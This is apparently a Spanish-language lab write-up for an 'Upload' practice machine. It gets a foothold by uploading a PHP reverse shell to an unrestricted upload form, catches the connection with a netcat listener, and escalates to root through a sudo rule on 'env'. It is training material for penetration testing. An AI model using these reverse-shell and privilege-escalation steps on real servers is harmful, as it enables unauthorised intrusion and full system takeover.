# Upload

## Descripción

Laboratorio orientado a la explotación de un panel vulnerable de subida de archivos. El objetivo es aprovechar la funcionalidad de carga para subir una **Reverse Shell** en PHP, obtener acceso al servidor como `www-data` y, posteriormente, escalar privilegios hasta `root`.

---

# Enumeración

Como primer paso, realicé un escaneo para identificar los servicios expuestos por la máquina.

```bash
nmap -sC -sV 172.17.0.2
```

Resultado:

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))

http-title: Upload here your file
```

## Análisis del escaneo

El escaneo mostró únicamente un servicio **HTTP** en el puerto **80**.

Además, el título de la página era:

```text
Upload here your file
```

Esto indica que existe un formulario para subir archivos, por lo que probablemente sea el punto de entrada de la vulnerabilidad.

---

# Análisis de la aplicación

Al acceder desde el navegador encontré un panel muy sencillo que permitía subir archivos al servidor.

La idea era aprovechar esta funcionalidad para subir un archivo PHP que ejecutara una **Reverse Shell** cuando fuera visitado desde el navegador.

## Creación de la Reverse Shell

Para generar la shell utilicé una Reverse Shell en PHP obtenida desde:

- https://www.revshells.com/

También puede utilizarse la conocida shell de PentestMonkey.

Antes de guardarla fue necesario modificar los siguientes valores:

```php
$ip = '10.0.2.15';
$port = 4444;
```

Donde:

- **IP:** dirección IP de la máquina atacante.
- **Puerto:** puerto donde Netcat estará esperando la conexión.

Guardé el archivo con el nombre:

```text
shell.php
```

Finalmente lo subí desde el formulario y la aplicación respondió:

```text
The file shell.php has been uploaded.
```

Esto confirmaba que el archivo había sido aceptado por el servidor.

---

# Localizando el archivo subido

Aunque el archivo ya estaba cargado, todavía no sabía dónde había sido almacenado.

Como era probable que existiera un directorio llamado `/uploads`, decidí enumerarlo utilizando **Gobuster**.

```bash
gobuster dir -u http://172.17.0.2/uploads \
-w /usr/share/wordlists/dirb/common.txt \
-x php,html,txt
```

Entre los resultados apareció:

```text
shell.php (Status: 200)
```

Con esto confirmé que el archivo era accesible desde:

```text
http://172.17.0.2/uploads/shell.php
```

---

# Obteniendo la Reverse Shell

Antes de ejecutar el archivo era necesario preparar un listener con Netcat para recibir la conexión.

```bash
nc -lvnp 4444
```

Una vez escuchando el puerto, simplemente accedí desde el navegador a:

```text
http://172.17.0.2/uploads/shell.php
```

Al hacerlo, el servidor ejecutó el código PHP y recibí la conexión en mi máquina atacante.

```text
connect to [10.0.2.15] from 172.17.0.2
```

Comprobé el usuario con:

```bash
whoami
```

Resultado:

```text
www-data
```

Ya tenía ejecución remota de comandos sobre el servidor.

---

# Escalada de privilegios

El siguiente paso fue comprobar si el usuario tenía permisos para ejecutar comandos mediante `sudo`.

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/env
```

Esto significa que el usuario `www-data` puede ejecutar el binario `env` como **root** sin necesidad de introducir contraseña.

Cuando se obtiene un resultado interesante con `sudo -l`, una buena práctica es consultar **GTFOBins** para buscar posibles métodos de escalada:

- https://gtfobins.org/

Buscando el binario **env** encontré el siguiente comando:

```bash
sudo env /bin/sh
```

Inicialmente escribí:

```bash
sudo /usr/bin/env /bin/sh
```

pero cometí un error al ejecutarlo y no obtuve el resultado esperado.

Corrigiendo el comando:

```bash
sudo env /bin/sh
```

obtuve inmediatamente una shell como **root**.

---

# Mejorando la shell

Aunque ya tenía privilegios de administrador, la shell seguía siendo bastante limitada.

Primero intenté convertirla en una TTY utilizando Python.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Sin embargo, el sistema no tenía Python instalado, por lo que el comando falló.

Como alternativa utilicé `script`, que sí estaba disponible.

```bash
script /dev/null -c bash
```

Con este comando conseguí una shell mucho más estable e interactiva.

Para comprobar que todo había salido correctamente ejecuté:

```bash
whoami
```

Resultado:

```text
root
```

---

# Conclusión

Durante este laboratorio seguí los siguientes pasos:

1. Enumeré los servicios con **Nmap**.
2. Detecté un panel de subida de archivos.
3. Generé una Reverse Shell en PHP modificando la IP y el puerto.
4. Subí el archivo al servidor.
5. Localicé el archivo utilizando **Gobuster**.
6. Preparé un listener con **Netcat**.
7. Ejecuté la Reverse Shell obteniendo acceso como `www-data`.
8. Revisé los permisos con `sudo -l`.
9. Consulté **GTFOBins** para encontrar una técnica de escalada.
10. Aproveché el permiso sobre `env` para obtener una shell como `root`.
11. Mejoré la shell utilizando `script`.

Al finalizar el laboratorio conseguí acceso completo al sistema con privilegios de **root**.
